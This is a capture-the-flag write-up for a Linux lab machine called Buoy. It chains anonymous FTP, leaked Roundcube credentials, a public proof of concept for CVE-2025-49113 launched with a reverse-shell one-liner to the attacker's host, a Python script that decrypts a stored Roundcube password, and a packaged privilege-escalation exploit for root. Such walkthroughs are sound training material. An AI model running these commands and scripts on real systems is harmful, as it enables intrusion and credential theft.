---
cover: ../.gitbook/assets/buoy.jpeg
coverY: 0
---

# Buoy(Linux)

## Initial Enumeration :&#x20;

### NMAP :&#x20;

```
PORT    STATE SERVICE  REASON         VERSION
21/tcp  open  ftp      syn-ack ttl 63 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    4 115      116          4096 Oct 31  2025 old_rc
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.0.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 37:d0:23:c7:47:ed:ed:03:73:63:d7:b0:fb:3e:09:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHxa0ut8IBwZqZznm1RGptyn6+5yL70IcbMAyW/cVPlUKvsXrbB/QxcQapqEcgNIOtAFLhc+a4XMn89z4c9bqaA=
|   256 6d:1e:fe:86:1b:66:6a:49:82:6e:c8:a4:dd:96:39:3d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL3Kd8uYQWMrxMeVGTufOGo1cjOz7AwuNOXaBbvNZJfT
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
110/tcp open  pop3     syn-ack ttl 63 Dovecot pop3d
|_pop3-capabilities: SASL PIPELINING RESP-CODES STLS AUTH-RESP-CODE UIDL TOP CAPA
| ssl-cert: Subject: commonName=roundserver
| Subject Alternative Name: DNS:roundserver
| Issuer: commonName=roundserver
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-31T11:51:02
| Not valid after:  2035-10-29T11:51:02
| MD5:     d818 69f8 ce15 40d7 4919 23b4 781b f3ef
| SHA-1:   91bb 1277 1432 f2d7 0943 902f 4d56 50cb 058a 1ea2
| SHA-256: 54db 4525 852f d78b a17d 2314 8f6b 122b 214d a146 fd42 25fb 8675 a2c5 84f9 17a1
|_ssl-date: TLS randomness does not represent time
143/tcp open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_imap-capabilities: post-login SASL-IR listed IDLE more have ID LOGIN-REFERRALS capabilities Pre-login OK ENABLE LOGINDISABLEDA0001 LITERAL+ IMAP4rev1 STARTTLS
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=roundserver
| Subject Alternative Name: DNS:roundserver
| Issuer: commonName=roundserver
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-31T11:51:02
| Not valid after:  2035-10-29T11:51:02
| MD5:     d818 69f8 ce15 40d7 4919 23b4 781b f3ef
| SHA-1:   91bb 1277 1432 f2d7 0943 902f 4d56 50cb 058a 1ea2
| SHA-256: 54db 4525 852f d78b a17d 2314 8f6b 122b 214d a146 fd42 25fb 8675 a2c5 84f9 17a1
993/tcp open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=roundserver
| Subject Alternative Name: DNS:roundserver
| Issuer: commonName=roundserver
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-31T11:51:02
| Not valid after:  2035-10-29T11:51:02
| MD5:     d818 69f8 ce15 40d7 4919 23b4 781b f3ef
| SHA-1:   91bb 1277 1432 f2d7 0943 902f 4d56 50cb 058a 1ea2
| SHA-256: 54db 4525 852f d78b a17d 2314 8f6b 122b 214d a146 fd42 25fb 8675 a2c5 84f9 17a1
|_imap-capabilities: post-login SASL-IR listed IDLE more ID LOGIN-REFERRALS capabilities have Pre-login OK LITERAL+ AUTH=PLAINA0001 IMAP4rev1 ENABLE
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 syn-ack ttl 63 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL(PLAIN) PIPELINING RESP-CODES USER AUTH-RESP-CODE UIDL TOP CAPA
| ssl-cert: Subject: commonName=roundserver
| Subject Alternative Name: DNS:roundserver
| Issuer: commonName=roundserver
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-31T11:51:02
| Not valid after:  2035-10-29T11:51:02
| MD5:     d818 69f8 ce15 40d7 4919 23b4 781b f3ef
| SHA-1:   91bb 1277 1432 f2d7 0943 902f 4d56 50cb 058a 1ea2
| SHA-256: 54db 4525 852f d78b a17d 2314 8f6b 122b 214d a146 fd42 25fb 8675 a2c5 84f9 17a1

```

#### FTP (Port 21) :&#x20;

* Since From our Scans, We noticed that `Anonymous` FTP Access was Enabled and there was a directory named `old_rc` present .
* Since, I didn't want to check the files manually so I created a short bash script for this to download all the files on the FTP Server

```
#!/usr/bin/env bash

FTP_HOST="172.16.18.10"

wget \
  --ftp-user="anonymous" \
  --ftp-password="anoymous" \
  --recursive \
  --no-parent \
  --no-host-directories \
  --directory-prefix="." \
  "ftp://${FTP_HOST}/"

```

* Next we run this script

```
┌──(kali㉿kali)-[~/Desktop/ronin66/buoy]
└─$ ./script.sh    
--2026-08-18 09:02:52--  ftp://172.16.18.10/
           => ‘./.listing’
Connecting to 172.16.18.10:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

.listing                                                       [ <=>                                                                                                                                     ]     183  --.-KB/s    in 0.01s   

2026-08-18 09:02:54 (13.9 KB/s) - ‘./.listing’ saved [183]

Removed ‘./.listing’.
--2026-08-18 09:02:54--  ftp://172.16.18.10/old_rc/
           => ‘./old_rc/.listing’
==> CWD (1) /old_rc ... done.
==> PASV ... done.    ==> LIST ... done.

old_rc/.listing                                                [ <=> 
---------------------snip------------------------------------     
```

* We got a folder named `old_rc` from the FTP Access and now we analyze the files present in it.

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

* Upon seeing the files and opening the `README.md`, It hinted towards a `RoundCube` Instance

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>



* One very Important thing to note here was we had the Configuration File present in the `config` directory
* We found some cleartext credentials which could be used in the Next Steps probably.

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

#### Web Server(80,443) :&#x20;

* Now we have a look at the web server being hosted and have a look at it.

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

* We found an `Apache2` default page which wasn't very interesting so we look for any interesting directories using `gobuster`

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://172.16.18.10/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.18.10/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
roundcube            (Status: 301) [Size: 316] [--> http://172.16.18.10/roundcube/]
server-status        (Status: 403) [Size: 277]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================

```

* We found a path `/roundcube` so we go ahead and have a look at it

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

* We have a Login Page for the `RoundCube` Instance which is a Webmail Server
* We already had a pair of credential which we got from our earlier enumeration of FTP which was `marina:3467marina`

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

* The pair of credentials worked and we were successfully able to log in to the Instance
* Now We Check the Version of this Instance to see if we have any Publicly Available Exploits

<figure><img src="../.gitbook/assets/image (9).png" alt="" width="352"><figcaption></figcaption></figure>

* After a bit of Research we Found out that this Version of `Roundcube` Instance was Vulnerable to a Post-Auth RCE which was `CVE-2025-49113`
* We found a public POC for this CVE

{% embed url="https://github.com/fearsoff-org/CVE-2025-49113" %}

## Shell as `www-data` :&#x20;

* We now use this public POC to get a reverse shell and start a listener on port `9001`

```
┌──(kali㉿kali)-[~/…/ronin66/buoy/CVE-2025-49113-exploit]
└─$ php CVE-2025-49113.php http://172.16.18.10/roundcube/ marina 3467marina "bash -c 'bash -i >& /dev/tcp/10.8.0.19/9001 0>&1'"
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
PHP Warning:  file_get_contents(http://172.16.18.10/roundcube//?_task=settings&_framed=1&_remote=1&_from=edit-!xxx&_id=&_uploadid=upload1749190777535&_unlock=loading1749190777536&_action=upload): Failed to open stream: HTTP request failed! in /home/kali/Desktop/ronin66/buoy/CVE-2025-49113/CVE-2025-49113-exploit/CVE-2025-49113.php on line 206
Error: Failed to send the file.
```

* We got a reverse shell on our listener as the user `www-data`

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

* Now one thing to note here is that we are more interested to see more configuration files of the Roundcube Instance so we try to look for some Interesting files which could probably be like a DB for roundcube, etc.

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

* There were a bunch of files related to the Roundcube Instance which is hosted so we deeply try to enumerate each of them
* We didn't find any leaked credentials in these files so we took a step back and analyzed all the steps we did till now.
* Interestingly, We had found another pair of credential in the config file located in `/var/www/html/roundcube/config` directory

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

* The password seemed to be URL-encoded value so we decode it

<figure><img src="../.gitbook/assets/image (14).png" alt="" width="155"><figcaption></figcaption></figure>

* This clearly seemed to be a `MYSQL` database credential so we use it to authenticate to `localhost` with `MYSQL`&#x20;

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

* Now We confirmed these credentials were valid and we were able to list the Databases, we try to see the tables for the roundcube instance. (Note: the `/` in the password is just used for escape sequence)

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

* Now we list out everything from every table to see any interesting vectors
* Afer dumping some tables we found an interesting thing in the `sessions` table

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

* These seemed like a `base64` encoded values and there were a lot of them so we copied all and decoded them

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

* We interestingly found an encrypted password for the user `Leo` from it
* Earlier During FTP Enum we also had found the `DES` Key in the same configuration file where we found the leaked initial credentials.

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

* A thing that came to our mind was, probably we can try and see if we can decrypt this password and for this we needed to have a look at how the decryption function takes place in the actual code.
* After a bit of research, we found that decryption function could be checked in `rcube.php` file which was present in `/var/www/html/roundcube/program/lib/Roundcube` directory, so we have a look at it

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

* From this section of the Code we got it how the passwords were being encrypted, It was using Triple DES CBC, key is the raw `des_key` string, IV is first 8 bytes.

## Shell as `leo`:&#x20;

* Now we create a python script that will decrypt that encrypted password for `leo` user

```
import base64
from Crypto.Cipher import DES3

def decrypt_roundcube(des_key, encrypted_b64):
    # Key: raw des_key padded/truncated to 24 bytes
    key = (des_key.encode() * 2)[:24]
    
    enc = encrypted_b64.strip()
    enc += '=' * (4 - len(enc) % 4)
    data = base64.b64decode(enc)
    
    # DES-EDE3-CBC: IV is first 8 bytes, ciphertext is the rest
    iv = data[:8]
    ciphertext = data[8:]
    
    cipher = DES3.new(key, DES3.MODE_CBC, iv)
    decrypted = cipher.decrypt(ciphertext)
    
    # Remove PKCS7 padding
    pad_len = decrypted[-1]
    return decrypted[:-pad_len].decode('utf-8', errors='replace')

des_key = 'lCP7fwi7Irf9uMT4nDl6G74D'

passwords = {
    'leo':     '+I3J+D4QPt7JZVfbcd/KIpQNr8k1b+SC'
}

for user, enc in passwords.items():
    try:
        print(f"{user}: {decrypt_roundcube(des_key, enc)}")
    except Exception as e:
        print(f"{user}: failed — {e}")

```

* We now run this script

```
┌──(.venv)─(kali㉿kali)-[~/Desktop/ronin66/buoy]
└─$ python3 script.py                                                     
leo: cleopatra1956
```

* We have the credentials for the `leo` user now we can try to SSH into the machine using these creds

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

* We were successfully able to `SSH` into the machine as `leo` user and at this point we got our&#x20;

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

## Shell as `root` :&#x20;

* Now for privesc, we use the `linpeas.sh` script to see any interesting vectors
* We transfer `linpeas.sh` to the machine from our host

```
┌──(kali㉿kali)-[~/Desktop/ronin66/buoy]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

* On the victim machine we use wget

```
leo@roundserver:~$ wget http://10.8.0.19:8000/linpeas.sh
--2026-08-19 18:34:20--  http://10.8.0.19:8000/linpeas.sh
Connecting to 10.8.0.19:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1133905 (1.1M) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>]   1.08M   785KB/s    in 1.4s    

2026-08-19 18:34:22 (785 KB/s) - ‘linpeas.sh’ saved [1133905/1133905]

```

* Now we ran the `linpeas.sh` and got a bunch of output and after analyzing the output for a while we had an Interesting finding

<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

* We found that this version of Ubuntu running on the Machine is Vulnerable to `CVE-2026-41651` which is `Pack2TheRoot` .&#x20;
* We get the public POC of this from github on our machine and compile it&#x20;

{% embed url="https://github.com/Lutfifakee-Project/CVE-2026-41651" %}

```
┌──(kali㉿kali)-[~/Desktop/ronin66/buoy]
└─$ git clone https://github.com/Lutfifakee-Project/CVE-2026-41651.git
cd CVE-2026-41651
Cloning into 'CVE-2026-41651'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 12 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (12/12), 10.67 KiB | 10.67 MiB/s, done.
Resolving deltas: 100% (1/1), done.
```

* Now we compile it

```
┌──(kali㉿kali)-[~/Desktop/ronin66/buoy/CVE-2026-41651]
└─$ gcc -o exploit CVE-2026-41651.c \
`pkg-config --cflags --libs glib-2.0 gio-2.0` \
-Wall

```

* Now we transfer the compiled binary named `exploit` using our python basic web server

```
┌──(kali㉿kali)-[~/Desktop/ronin66/buoy/CVE-2026-41651]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

* On the Machine as `leo` we use `wget` to download the binary

```
 wget http://10.8.0.19:8000/exploit
--2026-08-19 19:33:13--  http://10.8.0.19:8000/exploit
Connecting to 10.8.0.19:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27720 (27K) [application/octet-stream]
Saving to: ‘exploit’

exploit                                                    100%[========================================================================================================================================>]  27.07K   118KB/s    in 0.2s    

2026-08-19 19:33:14 (118 KB/s) - ‘exploit’ saved [27720/27720]

```

* After running the Binary, we were succcessfully able to escalate to `root` user.
* Now we got our `root.flg` in the `/root` directory

<figure><img src="../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

* We have now successfully solved this machine !!!
